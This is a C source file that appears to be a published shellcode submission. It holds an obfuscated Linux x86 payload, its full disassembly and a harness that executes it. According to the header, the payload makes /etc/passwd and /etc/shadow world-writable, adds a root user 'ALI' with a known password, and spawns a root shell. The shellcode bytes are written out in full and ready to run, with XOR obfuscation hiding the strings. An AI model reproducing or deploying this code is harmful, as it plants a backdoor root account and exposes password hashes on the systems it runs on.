/*
#Title: Obfuscated Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh
#length: 521 bytes
#Date: 8 September  2018
#Author: Ali Razmjoo
#tested On: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]



Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com
Thanks to Jonathan Salwan


chmod('/etc/passwd',777)
chmod('/etc/shadow',777)
open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd
setreuid() , execve('/bin/sh')


root@user:~/Desktop/xpl# objdump -d f.o

f.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   bb 59 45 4f 53          mov    $0x534f4559,%ebx
   d:   ba 33 36 38 37          mov    $0x37383633,%edx
  12:   31 d3                   xor    %edx,%ebx
  14:   53                      push   %ebx
  15:   c1 eb 08                shr    $0x8,%ebx
  18:   53                      push   %ebx
  19:   bb 7a 46 59 45          mov    $0x4559467a,%ebx
  1e:   ba 55 36 38 36          mov    $0x36383655,%edx
  23:   31 d3                   xor    %edx,%ebx
  25:   53                      push   %ebx
  26:   bb 67 58 45 4e          mov    $0x4e455867,%ebx
  2b:   ba 48 3d 31 2d          mov    $0x2d313d48,%edx
  30:   31 d3                   xor    %edx,%ebx
  32:   53                      push   %ebx
  33:   89 e3                   mov    %esp,%ebx
  35:   68 41 41 ff 01          push   $0x1ff4141
  3a:   59                      pop    %ecx
  3b:   c1 e9 08                shr    $0x8,%ecx
  3e:   c1 e9 08                shr    $0x8,%ecx
  41:   6a 0f                   push   $0xf
  43:   58                      pop    %eax
  44:   cd 80                   int    $0x80
  46:   bb 53 49 57 4a          mov    $0x4a574953,%ebx
  4b:   ba 39 2d 38 3d          mov    $0x3d382d39,%edx
  50:   31 d3                   xor    %edx,%ebx
  52:   c1 eb 08                shr    $0x8,%ebx
  55:   53                      push   %ebx
  56:   bb 6d 47 45 58          mov    $0x5845476d,%ebx
  5b:   ba 42 34 2d 39          mov    $0x392d3442,%edx
  60:   31 d3                   xor    %edx,%ebx
  62:   53                      push   %ebx
  63:   bb 6e 54 49 57          mov    $0x5749546e,%ebx
  68:   ba 41 31 3d 34          mov    $0x343d3141,%edx
  6d:   31 d3                   xor    %edx,%ebx
  6f:   53                      push   %ebx
  70:   89 e3                   mov    %esp,%ebx
  72:   68 41 41 ff 01          push   $0x1ff4141
  77:   59                      pop    %ecx
  78:   c1 e9 08                shr    $0x8,%ecx
  7b:   c1 e9 08                shr    $0x8,%ecx
  7e:   6a 0f                   push   $0xf
  80:   58                      pop    %eax
  81:   cd 80                   int    $0x80
  83:   bb 73 47 4e 51          mov    $0x514e4773,%ebx
  88:   ba 32 34 39 35          mov    $0x35393432,%edx
  8d:   31 d3                   xor    %edx,%ebx
  8f:   c1 eb 08                shr    $0x8,%ebx
  92:   53                      push   %ebx
  93:   bb 59 44 56 44          mov    $0x44564459,%ebx
  98:   ba 76 34 37 37          mov    $0x37373476,%edx
  9d:   31 d3                   xor    %edx,%ebx
  9f:   53                      push   %ebx
  a0:   bb 4e 58 59 51          mov    $0x5159584e,%ebx
  a5:   ba 61 3d 2d 32          mov    $0x322d3d61,%edx
  aa:   31 d3                   xor    %edx,%ebx
  ac:   53                      push   %ebx
  ad:   89 e3                   mov    %esp,%ebx
  af:   68 41 41 01 04          push   $0x4014141
  b4:   59                      pop    %ecx
  b5:   c1 e9 08                shr    $0x8,%ecx
  b8:   c1 e9 08                shr    $0x8,%ecx
  bb:   6a 05                   push   $0x5
  bd:   58                      pop    %eax
  be:   cd 80                   int    $0x80
  c0:   89 c3                   mov    %eax,%ebx
  c2:   6a 04                   push   $0x4
  c4:   58                      pop    %eax
  c5:   68 41 73 68 0a          push   $0xa687341
  ca:   59                      pop    %ecx
  cb:   c1 e9 08                shr    $0x8,%ecx
  ce:   51                      push   %ecx
  cf:   b9 57 67 57 58          mov    $0x58576757,%ecx
  d4:   ba 39 48 35 39          mov    $0x39354839,%edx
  d9:   31 d1                   xor    %edx,%ecx
  db:   51                      push   %ecx
  dc:   b9 4e 64 5a 51          mov    $0x515a644e,%ecx
  e1:   ba 74 4b 38 38          mov    $0x38384b74,%edx
  e6:   31 d1                   xor    %edx,%ecx
  e8:   51                      push   %ecx
  e9:   b9 47 57 56 42          mov    $0x42565747,%ecx
  ee:   ba 35 38 39 36          mov    $0x36393835,%edx
  f3:   31 d1                   xor    %edx,%ecx
  f5:   51                      push   %ecx
  f6:   b9 61 70 51 4e          mov    $0x4e517061,%ecx
  fb:   ba 2d 39 6b 61          mov    $0x616b392d,%edx
 100:   31 d1                   xor    %edx,%ecx
 102:   51                      push   %ecx
 103:   b9 48 58 70 74          mov    $0x74705848,%ecx
 108:   ba 72 68 4a 35          mov    $0x354a6872,%edx
 10d:   31 d1                   xor    %edx,%ecx
 10f:   51                      push   %ecx
 110:   b9 76 45 56 46          mov    $0x46564576,%ecx
 115:   ba 3d 6b 6c 76          mov    $0x766c6b3d,%edx
 11a:   31 d1                   xor    %edx,%ecx
 11c:   51                      push   %ecx
 11d:   68 66 77 55 57          push   $0x57557766
 122:   68 68 70 31 50          push   $0x50317068
 127:   68 7a 59 65 41          push   $0x4165597a
 12c:   68 41 61 41 51          push   $0x51416141
 131:   68 49 38 75 74          push   $0x74753849
 136:   68 50 4d 59 68          push   $0x68594d50
 13b:   68 54 42 74 7a          push   $0x7a744254
 140:   68 51 2f 38 54          push   $0x54382f51
 145:   68 45 36 6d 67          push   $0x676d3645
 14a:   68 76 50 2e 73          push   $0x732e5076
 14f:   68 4e 58 52 37          push   $0x3752584e
 154:   68 39 4b 55 48          push   $0x48554b39
 159:   68 72 2f 59 42          push   $0x42592f72
 15e:   68 56 78 4b 47          push   $0x474b7856
 163:   68 39 55 66 5a          push   $0x5a665539
 168:   68 46 56 6a 68          push   $0x686a5646
 16d:   68 46 63 38 79          push   $0x79386346
 172:   68 70 59 6a 71          push   $0x716a5970
 177:   68 77 69 53 68          push   $0x68536977
 17c:   68 6e 54 67 54          push   $0x5467546e
 181:   68 58 4d 69 37          push   $0x37694d58
 186:   68 2f 41 6e 24          push   $0x246e412f
 18b:   68 70 55 6e 4d          push   $0x4d6e5570
 190:   68 24 36 24 6a          push   $0x6a243624
 195:   b9 73 61 74 67          mov    $0x67746173,%ecx
 19a:   ba 32 2d 3d 5d          mov    $0x5d3d2d32,%edx
 19f:   31 d1                   xor    %edx,%ecx
 1a1:   51                      push   %ecx
 1a2:   89 e1                   mov    %esp,%ecx
 1a4:   ba 41 41 41 7f          mov    $0x7f414141,%edx
 1a9:   c1 ea 08                shr    $0x8,%edx
 1ac:   c1 ea 08                shr    $0x8,%edx
 1af:   c1 ea 08                shr    $0x8,%edx
 1b2:   cd 80                   int    $0x80
 1b4:   31 c0                   xor    %eax,%eax
 1b6:   b0 46                   mov    $0x46,%al
 1b8:   31 db                   xor    %ebx,%ebx
 1ba:   31 c9                   xor    %ecx,%ecx
 1bc:   cd 80                   int    $0x80
 1be:   31 c0                   xor    %eax,%eax
 1c0:   b0 46                   mov    $0x46,%al
 1c2:   31 db                   xor    %ebx,%ebx
 1c4:   31 c9                   xor    %ecx,%ecx
 1c6:   cd 80                   int    $0x80
 1c8:   68 52 55 48 42          push   $0x42485552
 1cd:   68 52 51 49 43          push   $0x43495152
 1d2:   b9 49 4b 59 77          mov    $0x77594b49,%ecx
 1d7:   ba 66 38 31 35          mov    $0x35313866,%edx
 1dc:   31 d1                   xor    %edx,%ecx
 1de:   51                      push   %ecx
 1df:   b9 55 55 54 57          mov    $0x57545555,%ecx
 1e4:   ba 7a 37 3d 39          mov    $0x393d377a,%edx
 1e9:   31 d1                   xor    %edx,%ecx
 1eb:   51                      push   %ecx
 1ec:   89 e3                   mov    %esp,%ebx
 1ee:   31 c0                   xor    %eax,%eax
 1f0:   88 43 07                mov    %al,0x7(%ebx)
 1f3:   89 5b 08                mov    %ebx,0x8(%ebx)
 1f6:   89 43 0c                mov    %eax,0xc(%ebx)
 1f9:   b0 0b                   mov    $0xb,%al
 1fb:   8d 4b 08                lea    0x8(%ebx),%ecx
 1fe:   8d 53 0c                lea    0xc(%ebx),%edx
 201:   cd 80                   int    $0x80
 203:   b0 01                   mov    $0x1,%al
 205:   b3 01                   mov    $0x1,%bl
 207:   cd 80                   int    $0x80
root@user:~/Desktop/xpl#



*/

#include <stdio.h>
#include <string.h>
char sc[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xbb\x59\x45\x4f\x53\xba\x33\x36\x38\x37\x31\xd3\x53\xc1\xeb\x08\x53\xbb\x7a\x46\x59\x45\xba\x55\x36\x38\x36\x31\xd3\x53\xbb\x67\x58\x45\x4e\xba\x48\x3d\x31\x2d\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x53\x49\x57\x4a\xba\x39\x2d\x38\x3d\x31\xd3\xc1\xeb\x08\x53\xbb\x6d\x47\x45\x58\xba\x42\x34\x2d\x39\x31\xd3\x53\xbb\x6e\x54\x49\x57\xba\x41\x31\x3d\x34\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x73\x47\x4e\x51\xba\x32\x34\x39\x35\x31\xd3\xc1\xeb\x08\x53\xbb\x59\x44\x56\x44\xba\x76\x34\x37\x37\x31\xd3\x53\xbb\x4e\x58\x59\x51\xba\x61\x3d\x2d\x32\x31\xd3\x53\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x05\x58\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\xb9\x57\x67\x57\x58\xba\x39\x48\x35\x39\x31\xd1\x51\xb9\x4e\x64\x5a\x51\xba\x74\x4b\x38\x38\x31\xd1\x51\xb9\x47\x57\x56\x42\xba\x35\x38\x39\x36\x31\xd1\x51\xb9\x61\x70\x51\x4e\xba\x2d\x39\x6b\x61\x31\xd1\x51\xb9\x48\x58\x70\x74\xba\x72\x68\x4a\x35\x31\xd1\x51\xb9\x76\x45\x56\x46\xba\x3d\x6b\x6c\x76\x31\xd1\x51\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\xb9\x73\x61\x74\x67\xba\x32\x2d\x3d\x5d\x31\xd1\x51\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x52\x55\x48\x42\x68\x52\x51\x49\x43\xb9\x49\x4b\x59\x77\xba\x66\x38\x31\x35\x31\xd1\x51\xb9\x55\x55\x54\x57\xba\x7a\x37\x3d\x39\x31\xd1\x51\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
int main(void)
{

    fprintf(stdout,"Length: %d\n\n",strlen(sc));

    (*(void(*)()) sc)();

}